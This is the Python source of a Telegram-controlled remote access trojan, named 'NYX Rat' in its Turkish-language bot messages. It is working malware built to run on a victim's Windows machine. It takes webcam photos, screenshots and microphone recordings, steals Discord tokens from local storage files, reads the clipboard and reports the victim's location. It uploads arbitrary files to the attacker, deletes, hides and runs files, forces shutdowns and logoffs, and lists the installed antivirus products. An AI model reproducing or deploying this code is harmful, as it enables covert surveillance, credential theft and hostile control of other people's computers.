import os
import shutil
import time
from pyperclip import paste
import requests
import subprocess
import pyautogui
import sounddevice
import telebot
import win32gui
import cv2
import webbrowser
import ctypes
import pyttsx3
import sounddevice as sd
from scipy.io.wavfile import write
import re
import win32api
import win32con
import random




bot = telebot.TeleBot("Token")


class Fonkss(object):

    def __init__(self):
        self.path = os.getenv('AppData')
        self.path_dc = [self.path + '\\Discord', self.path + '\\discordcanary', self.path + '\\discordptb']
        self.TOKEN = []

    def Location_(self):
        r = requests.get("https://ipinfo.io/").json()
        return r["ip"], r["loc"]

    def Message_Bot(self, title, message):
        win32gui.MessageBox(0, message, title, 0)

    def WhoAmi(self):
        return os.getenv('username')

    def WebCamFonks(self):
        path = os.getenv("APPDATA")+os.sep+"v.png"
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(path, image)
        camera.release()
        cv2.destroyAllWindows()
        return path

    def OpenUrl(self, url):
        webbrowser.open(url)

    def OpenCd(self):
        ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None)

    def Speak_(self, text):
        engine = pyttsx3.init()
        engine.say(text=text)
        engine.runAndWait()


    def Chwall_(self, url):
        path = os.getenv('AppData')+os.sep+"f.png"
        r = requests.get(url=url).content
        with open(path, "wb") as f:
            f.write(r)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


    def Pwd_(self):
        return os.getcwd()

    def Dir_(self):
        return os.listdir()

    def Cd_(self, path):
        return os.chdir(path=path)

    def Token_find(self, Directory):

        Directory += '\\Local Storage\\leveldb'

        for file in os.listdir(Directory):
            if not file.endswith('.log') and not file.endswith('.ldb'):
                continue
            for lin in open(f'{Directory}\\{file}', errors='ignore').readlines():
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for _ in re.findall(regex, lin.strip()):
                        self.TOKEN.append(_)

        return self.TOKEN

    def DC_tOKEN(self):

        for _ in self.path_dc:

            if os.path.exists(_):
                Tokens = self.Token_find(_)

                if len(Tokens) > 0:
                    for Token in Tokens:
                        return Token
                else:
                    return "Token Bulunamadı"


    def Antivirus_fonks(self):
        Antivirus_List = {
            'C:\\Program Files\\Windows Defender': 'Windows Defender',
            'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
            'C:\\Program Files\\AVG\\Antivirus': 'AVG',
            'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
            'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
            'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
            'C:\\Program Files\\DrWeb': 'Dr.Web',
            'C:\\Program Files\\ESET\\ESET Security': 'ESET',
            'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
            'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security'
        }

        return [Antivirus_List[_] for _ in Antivirus_List if os.path.exists(_)]

    def OpenCmd(self, msg):
        try:
            subprocess.Popen(["start", "cmd", "/k", "color a"], shell=True)
            time.sleep(1)
            pyautogui.write(msg, interval=0.3)
        except:
            ...

fonks = Fonkss()

@bot.message_handler(commands=['start'])
def handle_command(message):
    bot.reply_to(message, "🔘 NYX Rat Kullanıma Hazır 🔘 "
                          f"\nMerhaba {message.from_user.first_name} ! "
                          f"\n\nKomutlar : /Commands"
                 )

@bot.message_handler(commands=["location"])
def Location(message):
    bot.send_message(message.from_user.id,
                     f"İp : {fonks.Location_()[0]}"
                     )
    bot.send_location(message.from_user.id, (fonks.Location_()[1].split(",")[0]), (fonks.Location_()[1].split(",")[1]))


@bot.message_handler(commands=["MessageBox"])
def Message_Box_(message):
    mes = str(message.text)
    message_ = mes[mes.find("x")+1:].split(",")
    try:
        fonks.Message_Bot(message_[0], message_[1])
        bot.reply_to(message, "Pencere Başarıyla Açıldı ve Kullanıcı tarafından kapatıldı")
    except IndexError:
        bot.reply_to(message, "Hata Yanlış değer girildi, Lütfen tekrar deneyin ! ")



@bot.message_handler(commands=["Systeminfo"])
def SystemInfo_(message):
    Sysinfo = subprocess.check_output("systeminfo", shell=True)
    bot.reply_to(message, str(Sysinfo))


@bot.message_handler(commands=["Screenshot"])
def ScreenShot_(message):
    screen = pyautogui.screenshot()
    screen.save(os.getenv("APPDATA")+os.sep+"k.png")
    bot.send_photo(message.from_user.id, photo=open(os.getenv("APPDATA")+os.sep+'k.png', "rb"))
    os.remove(os.getenv("APPDATA")+os.sep+"k.png")

@bot.message_handler(commands=["whoami"])
def Whoami_(message):
    bot.reply_to(message, fonks.WhoAmi())


@bot.message_handler(commands=["Webcam"])
def WebCam(message):
    bot.send_photo(message.from_user.id, photo=open(fonks.WebCamFonks(), "rb"))


@bot.message_handler(commands=["OpenUrl"])
def OpenUrl_(message):
    try:
        message_ = str(message.text).split(" ")[-1]
        bot.reply_to(message, "Url Açıldı")
        fonks.OpenUrl(message_)

    except:
        ...
@bot.message_handler(commands=["OpenCdRom"])
def OpenCdRom_(message):
    bot.reply_to(message, "Cd rom açıldı")
    fonks.OpenCd()

@bot.message_handler(commands=["Speak"])
def Speak_(message):
    try:
        fonks.Speak_(str(message.text).split(",")[1])
        bot.reply_to(message, "Mesaj okundu")
    except:
        ...
@bot.message_handler(commands=["CHWAL"])
def CHWAL_(message):
    try:
        fonks.Chwall_(str(message.text).split(",")[1])
        bot.reply_to(message, "Arka plan resmi değişti")
    except:
        ...

@bot.message_handler(commands=["pwd"])
def Pwd_(message):
    bot.reply_to(message, fonks.Pwd_())


@bot.message_handler(commands=["dir"])
def Dir_(message):
    bot.reply_to(message, str(fonks.Dir_()))

@bot.message_handler(commands=["cd"])
def Cd_(message):
    try:

        fonks.Cd_(str(message.text[message.text.find(" "):]).strip())

        bot.reply_to(message, f"Şimdiki dizin : {fonks.Pwd_()}")
    except FileNotFoundError:
        bot.reply_to(message, "Dizin Bulunamadı")

@bot.message_handler(commands=["Download"])
def Download_(message):
    try:
        file = (str(message.text).split(" ")[-1])
        doc = open(f"{file}", "rb")
        bot.send_document(message.chat.id, doc)
    except:
        ...


@bot.message_handler(commands=["Delete"])
def Delete_(message):
    try:
        os.remove(str(message.text).split(" ")[-1])
        bot.reply_to(message, "Dosya silindi ")
    except FileNotFoundError:
        bot.reply_to(message, "Dosya ismi girilmedi ")



@bot.message_handler(commands=["shutdown"])
def Shutdown(message):
    bot.reply_to(message, "Bilgisayar Kapanıyor")
    subprocess.call('shutdown -s -f -t 3', shell=True)

@bot.message_handler(commands=["Restart"])
def Restart_(message):
    bot.reply_to(message, "Bilgisayar yeniden başlatılacak")
    subprocess.call('shutdown -r /t 0 /f', shell=True)


@bot.message_handler(commands=["Audio"])
def Audio_(message):
    try:
        frekans = 44100
        sure = int(str(message.text).split(" ")[-1])
        kaydet = sd.rec(int(sure * frekans), samplerate=frekans, channels=2)
        bot.reply_to(message, "Mikrofun kayıt ediliyor")
        sd.wait()
        write("system.wav", frekans, kaydet)
        voice = open('system.wav', 'rb')
        bot.send_voice(message.chat.id, voice)
    except ValueError:
        bot.reply_to(message, "Hata ! Tekrar deneyin ...")
    except sounddevice.PortAudioError:
        bot.reply_to(message, "Mikrofona erişim sağlanamadı ...")



@bot.message_handler(commands=["DCToken"])
def DCToken_(message):
    try:
        bot.reply_to(message, f"Discord Token : \n\n{fonks.DC_tOKEN()}")
    except :
        ...

@bot.message_handler(commands=["VoiPow"])
def VoiPow_(message):
    try:
        msg = str(message.text).split(" ")[-1]
        bot.reply_to(message, "Ses yükseldi.")
        for i in range(int(msg)):
            win32api.keybd_event(win32con.VK_VOLUME_UP, 0)

    except:
        ...



@bot.message_handler(commands=["Antivirus"])
def Antivirus_(message):
    try:
        bot.reply_to(message, str(fonks.Antivirus_fonks()))
    except:
        bot.reply_to(message, "Bir antivirus programı bulunamadı")

@bot.message_handler(commands=["Mkdir"])
def Mkdir_(message):
    try:
        msg = str(message.text).replace("/Mkdir","").strip()
        os.mkdir(msg)
        bot.reply_to(message, f"{msg} Klasörü oluştu")
    except:
        ...
@bot.message_handler(commands=["PlaYT"])
def PlaYT(message):
    try:
        messa_ = str(message.text).replace("/PlaYT", "").strip()
        systemCommand = f' start  https://www.youtube.com/embed/{messa_}?autoplay=1&showinfo=0&controls=0'
        if len(messa_)>0:

            if os.system(systemCommand):
                bot.reply_to(message, "Video Oynatılıyor")
        elif messa_ == "":
            bot.reply_to(message, "Hata , video id numarasını girin...")
    except:
        bot.reply_to(message, "Bir hata oluştu...")


@bot.message_handler(commands=["Mposition"])
def Mposition_(message):
    try:
        bot.reply_to(message, f"Mouse Konumu: \n\n{pyautogui.position()}")
    except :
        ...

@bot.message_handler(commands=["MchPosition"])
def MchPosition_(message):
    try:
        messag = str(message.text).replace("/MchPosition","").strip().split()
        pyautogui.move(int(messag[0]), int(messag[-1]))
        bot.reply_to(message, "Mouse imleci belirtilen koordinatlara taşındı")
    except : ...



@bot.message_handler(commands=["fMkdir"])
def fMkdir_(message):

    file_ = str(message.text).replace("/fMkdir", "").strip()
    if file_ > str(1):
        for _ in range(int(file_)):
            os.mkdir(str(random.random()))
        bot.reply_to(message, "Dosyalar Oluştu")
    else:
        bot.reply_to(message, "Hata , oluşturulacak dosya sayısını giriniz")

@bot.message_handler(commands=["Cmd"])
def open_cmd(message):
    ms = str(message.text).replace("/Cmd", "").strip()
    if ms == "":
        bot.reply_to(message, "Mesajı Girin")
    else:
        fonks.OpenCmd(msg=ms)
        bot.reply_to(message, "Mesaj Yazıldı")
        pyautogui.press("enter")
        pyautogui.write("exit()", interval=0.1)
        pyautogui.press("enter")

@bot.message_handler(commands=["ChFile"])
def ChFile_(message):
    try:

        msg = str(message.text).replace("/ChFile", "").split()
        if msg != "":
            os.rename(msg[0].strip(), msg[-1].strip())
            bot.reply_to(message,f"{msg[0].strip()} Dosyası {msg[-1].strip()} Olarak değiştirildi")
    except:
        bot.reply_to(message, "Bir hata oluştu , Tekrar deneyin..")




@bot.message_handler(commands=["Cpp"])
def cpp_0(message):
    try:
        bot.reply_to(message, str(paste()))
    except:
        ...

@bot.message_handler(commands=["Rfile"])
def Rfile_(message):
    try:
        msg = str(message.text).replace("/Rfile", "").strip()
        os.startfile(msg)
        bot.reply_to(message, f"_{msg}_ *Dosyası Açıldı*", parse_mode ='Markdown')
    except:
        ...
#----------------------------------------------------------------------------------
@bot.message_handler(commands=["Move"])
def Move_(message):
    try:
        msg = str(message.text).replace("/Move", "").strip().split(",")
        shutil.move(msg[0].strip(), msg[-1].strip())
        bot.reply_to(message, f"_{msg[0]}_ Dosyası _{msg[-1]}_ Konumuna taşındı...", parse_mode="Markdown")
    except:
        ...


@bot.message_handler(commands=["ClSession"])
def cl_session(message):
    bot.reply_to(message, "Kullanıcı Oturumu kapatıldı")
    subprocess.call('shutdown -l /f', shell=True)


@bot.message_handler(commands=["Gfile"])
def G_file(message):
    try:
        file = str(message.text).replace("/Gfile", "").strip()
        os.system(f"attrib +h {file}")
        bot.reply_to(message,f"{file} Dosyası Gizlendi")
    except:
        ...

@bot.message_handler(commands=["ShowFile"])
def show_file(message):
    try:
        file = str(message.text).replace("/ShowFile", "").strip()
        os.system(f"attrib -h {file}")
        bot.reply_to(message, f"{file} Dosyası geri yüklendi")
    except:
        ...

#----------------------------------------------------------------------------------

@bot.message_handler(commands=["Commands"])
def Command_List(message):
    bot.reply_to(message, "\n 🔺 *K O M U T L A R 🔺* "
                          "\n\n☆ /Screenshot : Ekran Görüntüsü alır."
                          "\n\n☆ /location : Konum bilgilerini gösterir."
                          "\n\n☆ /MessageBox : Ekranda mesaj kutusu Gösterir. exp(/MessageBox title , message )."
                          "\n\n☆ /Systeminfo : Sistem özelliklerini gösterir. "
                          "\n\n☆ /Webcam : Kamera'dan resim çeker."
                          "\n\n☆ /whoami : Kullanıcı adını gösterir."
                          "\n\n☆ /Audio : Verilen saniye kadar mikrofundan ses kayıt eder exp(/Audio 5)"
                          "\n\n☆ /OpenUrl : Url adresini tarayıcıda açar. exp(/OpenUrl https://test. com/)"
                          "\n\n☆ /OpenCdRom : Cd rom'u açar"
                          "\n\n☆ /shutdown : Bilgisayarı kapatır."
                          "\n\n☆ /Speak : Verilen mesaji sesli bir şekilde okur exp(/Speak , message)"
                          "\n\n☆ /CHWAL : Bilgisayarın arka plan resmini değiştirir exp(/CHWAL , url)"
                          "\n\n☆ /cd : Dosyalar arasında gezinme exp(/cd Desktop)"
                          "\n\n☆ /dir : Klasörde'ki dosyaları gösterir"
                          "\n\n☆ /Download : Belirtilen dosyayı indirir exp(/Download filename.txt)"
                          "\n\n☆ /pwd : Geçerli olan dizini gösterir"
                          "\n\n☆ /Delete : Belirtilen dosyayı siler exp(/Delete filename.txt)"
                          "\n\n☆ /Restart : Bilgisayarı yeniden başlatır"
                          "\n\n☆ /DCToken : Kullanıcının discord tokenini gönderir"
                          "\n\n☆ /VoiPow :Bilgisayarın sesini yükseltir exp(/VoiPow 3)"
                          #---------- V3 -------------------------
                          "\n\n☆ /Mkdir : Belirtilen isimde klasör oluşturur. exp(/Mkdir deneme)"
                          "\n\n☆ /fMkdir : Belirtilen sayı kadar klasör açar exp(fMkdir 10)" 
                          "\n\n☆ /Rfile : *Belirtilen dosyayı çalıştırır exp(/Rfile path )*"
                          "\n\n☆ /Cmd : Cmd yi açıp belirtilen mesaji yazar exp(/Cmd message)" 
                          "\n\n☆ /Cpp : *Panoda kopyalanmış son değeri gösterir.*"
                          "\n\n☆ /ClSession : Kullanıcı oturumunu kapatır. "
                          "\n\n☆ /PlaYT : Belirtilen youtube videosunu oynatır. exp(/PlayYT Youtube_Video_id)" 
                          "\n\n☆ /Mposition : Mouse'un bulunduğu konumu, pozisyonu gönderir." 
                          "\n\n☆ /MchPosition : Maouse'un konumunu verilen değerlere göre değiştirir. exp(/MchPosition x , y)" 
                          "\n\n☆ /Move : *Belirtilen dosyayı başka bir konuma taşır. exp(/Move path , target)*" 
                          "\n\n☆ /Antivirus : *Sistem'de bulunan antivirüs programını gösterir.*" 
                          "\n\n☆ /ChFile : *Belirtilen dosya ismini değiştirir.*"
                          "\n\n☆ /Gfile : Belirtilen dosyayı gizler, exp(/Gfile file.txt)"
                          "\n\n☆ /ShowFile : Gizlenen dosyayı gösterir.",

                 parse_mode='Markdown')


bot.polling()